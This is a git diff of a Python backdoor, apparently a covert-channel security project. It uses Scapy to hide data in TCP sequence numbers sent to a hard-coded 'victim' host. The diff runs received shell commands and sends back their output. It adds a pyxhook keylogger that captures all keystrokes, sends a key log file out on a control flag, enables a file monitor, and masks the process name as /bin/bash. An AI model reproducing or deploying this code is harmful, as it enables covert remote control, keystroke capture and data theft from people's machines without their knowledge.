@@ -24,35 +24,42 @@ pip3 install python-xlib
 
 TTL = 234
 TTLKEY = 222
-victim = ("192.168.0.7", 9999)
+victim = ("192.168.0.2", 9999)
 messages = []
 setFlag = "E"
 
 myip = ("192.168.0.3", 66)
 
 
-def secret_send(msg: str, type: str = 'command'):
+def secret_send(msg: str, type: str):
     """
     Keyword arguments:
     msg      - payload being sent
-    type     - file or command (default:command)
+    type     - file or command
     """
     if(type == "command"):
         # Convert message to ASCII to bits
         msg = message_to_bits(msg)
         chunks = message_spliter(msg)
         packets = packatizer(chunks)
-        knockOpen()
         send(packets, verbose=True)
-        knockClose()
+        send(IP(dst=victim[0], ttl=TTL) /
+                       TCP(sport=myip[1], dport=victim[1], flags="U"))
+    elif(type == "file"):
+        msg = message_to_bits(msg)
+        chunks = message_spliter(msg)
+        packets = packatizer(chunks)
+        send(packets, verbose=True)
+        send(IP(dst=victim[0], ttl=TTL) /
+                       TCP(sport=myip[1], dport=victim[1], flags="P"))
 
 
 def packatizer(msg):
     """[summary]
-    
+
     Arguments:
         msg {[type]} -- [description]
-    
+
     Returns:
         [type] -- [description]
     """
@@ -75,17 +82,15 @@ def packatizer(msg):
             # i.e. 1/3 messages to send.
             packets.append(craft(msg[counter]))
             counter = counter + 1
-    packets.append(IP(dst=victim[0], ttl=TTL) /
-                   TCP(sport=myip[1], dport=victim[1], flags="U"))
     return packets
 
 
 def craft(data: str) -> IP:
     """[summary]
-    
+
     Arguments:
         data {str} -- [description]
-    
+
     Returns:
         IP -- [description]
     """
@@ -93,14 +98,13 @@ def craft(data: str) -> IP:
     global TTL
     global setFlag
     # The payload contains the unique password, UID, position number and total.
-    packet = IP(dst=victim[0], ttl=TTL)/TCP(sport=myip[1], dport=victim[1],
-                                            seq=int(str(data), 2), flags=setFlag)
+    packet = IP(dst=victim[0], ttl=TTL)/TCP(sport=myip[1], dport=victim[1],seq=int(str(data), 2), flags=setFlag)
     return packet
 
 
 def execPayload(command):
     """[summary]
-    
+
     Arguments:
         command {str} -- [description]
     """
@@ -111,12 +115,19 @@ def execPayload(command):
     result = proc.stdout.read() + proc.stderr.read()
     payload = str(result)
     print(payload)
-    secret_send(payload)
+    secret_send(payload,"command")
 
+def getLogFile():
+    file = open('/root/Documents/file.log','r')
+    f = file.read()
+    #print(f)
+    secret_send(f,"file")
+    file.close()
+    return
 
 def commandResult(packet):
     """[summary]
-    
+
     Arguments:
         packet {scapy.packet} -- [description]
     """
@@ -138,6 +149,10 @@ def commandResult(packet):
             payload = ''.join(messages)
             execPayload(payload)
             messages = []
+        elif flag == 0x08:
+            getLogFile()
+            #print("Server wants key log file!")
+
 
 
 def commandSniffer():
@@ -149,11 +164,20 @@ setproctitle.setproctitle("/bin/bash")  # set fake process name
 sniffThread = threading.Thread(target=commandSniffer)
 fileMonitor = Monitor()
 
+#instantiate HookManager class
+new_hook=pyxhook.HookManager()
+#listen to all keystrokes
+new_hook.KeyDown=OnKeyPress
+#hook the keyboard
+new_hook.HookKeyboard()
+
 fileMonitor.daemon = True
 sniffThread.daemon = True
+new_hook.daemon = True
 
 sniffThread.start()
-# fileMonitor.start()
+fileMonitor.start()
+new_hook.start()
 
 while True:
     try:
